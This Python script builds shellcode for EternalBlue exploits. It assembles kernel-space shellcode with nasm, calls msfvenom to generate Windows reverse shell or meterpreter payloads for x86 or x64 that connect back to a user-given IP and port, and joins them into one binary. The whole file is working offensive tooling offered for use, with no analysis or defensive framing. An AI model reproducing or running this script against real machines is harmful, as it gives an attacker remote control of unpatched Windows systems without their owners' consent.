#!/usr/bin/python

'''This script generates shellcode for use with EternalBlue exploits,
by utilizing msfvenom to generate user-space code, then concatenating
it with the supplied kernel-space code. It gives the user a choice of 
a couple payloads each for x86 and x64 architectures.'''

__author__="phi10s"

import argparse
import subprocess
import sys

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="Local IP address for reverse connection")
parser.add_argument("lport", help="Local port number")
parser.add_argument("outfile",help="Name for the resulting shellcode binary")
parser.add_argument("-p","--payload", choices=["s","n","m"], default="n",
					help="Choose reverse shell payload\ns = staged\nn "
					+ "= non-staged\nm = meterpreter\n(Default = non-staged)")
parser.add_argument("-a","--arch", help="Target architecture (Default = x86)", 
					choices=["x86","x64"], default="x86")
args = parser.parse_args()
# print(args)

print("\n[*] Assembling kernel space shellcode binary\n")
subprocess.call("nasm -f bin eternalblue_kshellcode_x86.asm", shell=True)
subprocess.call("nasm -f bin eternalblue_kshellcode_x64.asm", shell=True)
print("\n[*] Invoking msfvenom to generate userspace shellcode binary\n")
if args.arch == "x64":
	x64_payloads = {"s":"windows/x64/shell/reverse_tcp",
				"m":"windows/x64/meterpreter/reverse_tcp",
				"n":"windows/x64/shell_reverse_tcp"}
	msfpayload = x64_payloads[args.payload]
	genshellcode = "msfvenom -p " + msfpayload + \
				" -f raw " + "-o userspacesc.tmp " \
				+ "EXITFUNC=thread " + "lhost=" + args.lhost \
				+ " lport=" + args.lport
	subprocess.call(genshellcode,shell=True)
	subprocess.call("cat eternalblue_kshellcode_x64 userspacesc.tmp > " + args.outfile, shell=True)
	subprocess.call("rm userspacesc.tmp",shell=True)
else:
	x86_payloads = {"s":"windows/shell/reverse_tcp","m":"windows/meterpreter/reverse_tcp",
				"n":"windows/shell_reverse_tcp"}	
	msfpayload = x86_payloads[args.payload]
	genshellcode = "msfvenom -p " + msfpayload + " -f raw " + "-o userspacesc.tmp " \
				+ "EXITFUNC=thread " + "lhost=" + args.lhost + " lport=" + args.lport
	subprocess.call(genshellcode,shell=True)
	subprocess.call("cat eternalblue_kshellcode_x86 userspacesc.tmp > " + args.outfile, shell=True)
	subprocess.call("rm userspacesc.tmp",shell=True)	
print("\n[*] Generated " + msfpayload + " payload\n")
